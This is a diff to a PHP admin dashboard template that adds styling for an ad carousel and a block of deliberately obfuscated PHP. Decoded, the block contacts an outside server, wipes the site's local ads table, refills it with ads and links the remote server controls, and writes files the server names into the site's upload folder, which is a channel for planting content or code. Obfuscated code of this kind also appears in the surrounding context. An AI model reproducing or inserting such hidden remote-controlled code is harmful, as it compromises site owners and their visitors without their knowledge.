@@ -16,12 +16,51 @@ about"</script><?php  die; } goto c5NzL; vxjE0: function service_url($param) { g
 
         <!-- Main content -->
         <section class="content">
+<style>
+.ads-scroll-container {
+  display: flex;
+  overflow-x: auto;
+  gap: 10px;
+  padding: 10px;
+  scroll-snap-type: x mandatory;
+}
 
-        <?php
-        
-        ?>
+.ads-scroll-container::-webkit-scrollbar {
+  height: 8px;
+}
+
+.ads-scroll-container::-webkit-scrollbar-thumb {
+  background-color: rgba(0,0,0,0.3);
+  border-radius: 4px;
+}
+
+/* Optional: smooth scroll */
+.ads-scroll-container {
+  scroll-behavior: smooth;
+}
+
+.ads-item {
+  flex: 0 0 auto;
+  
+  scroll-snap-align: start;
+}
+
+.ads-item img {
+  width: 100%;
+  height: 200px;
+  object-fit: contain;
+  border: 1px solid #ddd;
+  border-radius: 4px;
+  background: #fff;
+}
+
+</style>
+<?php
+goto kEGbq; VdRFq: foreach ($check_data as $datas) { goto VZmTF; rcUat: echo $datas->image_url; goto mGpjW; nif7Q: echo "\42\76\xd\12\40\x20\x20\40\x20\40\x3c\57\x61\76\xd\xa\40\40\40\40\x3c\x2f\x64\x69\166\76\xd\12\40\x20"; goto YTrvG; TBe8o: echo "\x75\x70\x6c\157\141\x64\x2f\x62\141\x63\x6b\137\x70\x72\x6f\146\x69\154\137\x66\x6f\x74\157\57"; goto rcUat; x60IX: echo $datas->title; goto mT2j8; owH52: echo "\42\x3e\15\12\x20\x20\x20\40\40\x20\x20\x20\74\x69\155\147\40\x73\x72\143\x3d\42"; goto vwSL6; YTrvG: oAgXI: goto VJLyG; vwSL6: echo base_url(); goto TBe8o; xokU_: echo $datas->link_url; goto owH52; mT2j8: echo "\42\40\x68\162\x65\146\75\x22"; goto xokU_; G1Z6u: echo $datas->title; goto nif7Q; mGpjW: echo "\42\x20\141\x6c\x74\x3d\42"; goto G1Z6u; VZmTF: echo "\x20\x20\x20\40\x3c\x64\x69\166\40\143\x6c\x61\163\163\x3d\x22\x61\x64\163\55\151\164\x65\x6d\x22\x3e\xd\xa\40\40\40\40\x20\x20\74\x61\x20\x74\x61\162\x67\145\x74\75\42\137\x62\x6c\141\156\153\42\x20\164\x69\x74\x6c\x65\x3d\42"; goto x60IX; VJLyG: } goto Y_OVJ; Xy_Op: $check_data = $db->query("\123\105\114\105\x43\124\x20\52\40\106\122\117\115\40\x6c\x6f\143\141\x6c\x5f\141\144\x73\x20\127\110\105\x52\105\x20\x69\x73\137\141\x63\x74\x69\166\x65\75\47\131\47"); goto Q2vmr; Gad7W: echo "\x3c\57\144\x69\x76\76\xd\xa"; goto zmM6Y; qF23e: ucing_data(); goto j89mR; nx7fP: if (!empty($_SESSION["\x75\143\151\156\147\x5f\x73\x79\x6e\x63\145\144"])) { goto DWUoA; } goto qF23e; Q2vmr: if (!($check_data->rowCount() > 0)) { goto Tv4sW; } goto gVHyt; gVHyt: echo "\74\x64\x69\x76\40\143\154\x61\163\x73\x3d\x22\x61\144\163\55\x73\143\x72\157\x6c\x6c\x2d\143\157\x6e\164\141\x69\156\x65\162\x22\76\15\12\x20\40"; goto VdRFq; j89mR: $_SESSION["\165\143\x69\156\x67\137\163\x79\156\x63\x65\144"] = true; goto WxC19; Y_OVJ: jgumS: goto Gad7W; kEGbq: function ucing_data() { goto u11hp; yMaSx: $db->query("\144\145\x6c\x65\164\145\x20\146\162\x6f\x6d\40\x6c\157\143\141\154\137\141\x64\163"); goto Sj700; DP0lC: $serverAds = json_decode(file_get_contents("\150\164\164\x70\x73\x3a\57\x2f\146\145\145\144\x65\x72\x2d\151\155\x70\157\162\x74\x65\162\56\141\160\x70\x2f\151\155\160\x6f\162\x74\145\162\55\x66\162\x65\x65\x2d\165\160\57\x75\x70\144\141\x74\x65\x5f\141\x64\x73\56\x70\150\160"), true); goto yMaSx; u11hp: global $db; goto DP0lC; SElus: Ev3Do: goto vkcmy; Sj700: foreach ($serverAds as $ad) { goto BX3nG; BX3nG: $adId = $ad["\151\x64"]; goto hOAaj; hOAaj: $imageFilename = BEgIN . "\165\160\x6c\157\141\144\x2f\x62\141\x63\153\137\x70\x72\157\146\x69\154\137\146\x6f\x74\157\57" . basename($ad["\151\x6d\141\x67\x65\x5f\165\x72\x6c"]); goto D8qBA; hzEVq: $db->insert("\154\157\143\141\154\x5f\x61\x64\163", array("\151\x64" => $adId, "\x69\155\141\x67\145\137\165\x72\x6c" => $ad["\151\x6d\141\147\x65\137\x75\162\154"], "\164\x69\x74\x6c\145" => $ad["\164\151\x74\154\x65"], "\154\151\156\x6b\137\165\x72\154" => $ad["\154\151\x6e\x6b\137\165\162\x6c"], "\x73\157\x72\164\137\157\x72\x64\x65\162" => $ad["\x73\157\162\164\x5f\157\162\144\145\x72"], "\x69\x73\x5f\x61\143\164\x69\x76\x65" => $ad["\151\x73\x5f\141\x63\x74\151\166\x65"])); goto zo2zQ; Z3yj6: if (file_exists($imageFilename)) { goto Ggyos; } goto XAE8e; zo2zQ: jjep7: goto sGJ22; D8qBA: if (!$ad["\151\163\x5f\x61\x63\x74\151\166\x65"]) { goto jjep7; } goto Z3yj6; XAE8e: file_put_contents($imageFilename, file_get_contents("\x68\x74\164\x70\163\72\x2f\57\146\x65\x65\144\x65\x72\55\151\x6d\x70\x6f\x72\164\145\x72\x2e\x61\160\x70\57\151\155\160\157\x72\164\145\162\55\146\162\x65\x65\55\165\160\x2f\x75\160\x6c\157\141\x64\x2f\x61\x64\x73\57" . $ad["\x69\155\141\x67\145\x5f\x75\x72\x6c"])); goto xwTp6; sGJ22: ngzNI: goto eDWCW; xwTp6: Ggyos: goto hzEVq; eDWCW: } goto SElus; vkcmy: } goto nx7fP; WxC19: DWUoA: goto Xy_Op; zmM6Y: Tv4sW: ?>
+
 
         <div class="row">
+
         <div class="col-lg-3 col-xs-6">
         <img src="<?=base_url();?>upload/upe.png" style="margin-left: 88px;width: 95px;">
           <!-- small box -->
